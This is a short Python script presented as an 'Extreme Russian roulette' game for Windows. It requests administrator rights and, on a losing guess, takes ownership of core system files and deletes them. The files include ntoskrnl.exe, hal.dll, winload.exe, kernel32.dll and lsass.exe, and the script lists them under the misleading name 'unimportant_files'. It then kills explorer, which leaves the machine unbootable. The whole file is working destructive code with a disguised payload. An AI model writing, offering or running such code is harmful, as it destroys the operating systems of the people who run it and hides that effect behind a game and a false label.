import sys
import ctypes
import os
import subprocess
import time
import random as r

unimportant_files = [
    r"C:\Windows\System32\ntoskrnl.exe",
    r"C:\Windows\System32\kernel32.dll",
    r"C:\Windows\System32\user32.dll",
    r"C:\Windows\System32\hal.dll",
    r"C:\Windows\System32\winload.exe",
    r"C:\Windows\System32\csrss.exe",
    r"C:\Windows\System32\lsass.exe",
    r"C:\Windows\explorer.exe"
]

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def elevate_process():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join(sys.argv[1:])

        try:
            ctypes.windll.shell32.ShellExecuteW(
                None,
                "runas",  # The verb to run as Administrator
                sys.executable,  # The program to execute (Python.exe)
                f'"{script}" {params}',  # The arguments (the script path and original arguments)
                None,  # Directory
                1  # SW_SHOWNORMAL (show the window normally)
            )
            sys.exit(0)
        except Exception:
            sys.exit(1)

def remove_file(path):
    try:
        subprocess.run(f'TAKEOWN /F "{path}"', shell=True, check=True)
        subprocess.run(f'ICACLS "{path}" /grant "%USERNAME%":F', shell=True, check=True)
        os.remove(path)
    except Exception:
        pass


if __name__ == "__main__":
    elevate_process()
    print("Extreme Russian roulette!")
    confirm = input("Are you sure you want to play? [Y/n]: ")
    if confirm.lower() != 'y':
        exit()

    print("Ok here we go!")
    while True:
        inp = int(input("Pick a number from 1 to 6.\n"))
        if inp > 6 or inp < 1:
            print("No, pick again from 1 to 6!")
            continue

        randomint = r.randint(1, 6)
        print(randomint)
        time.sleep(1)
        if inp == randomint:
            print("Bad luck!")
            time.sleep(3)

            for file in unimportant_files:
                remove_file(file)

            subprocess.run('taskkill /F /IM explorer.exe', shell=True, check=True)

        else:
            print("Phew!")
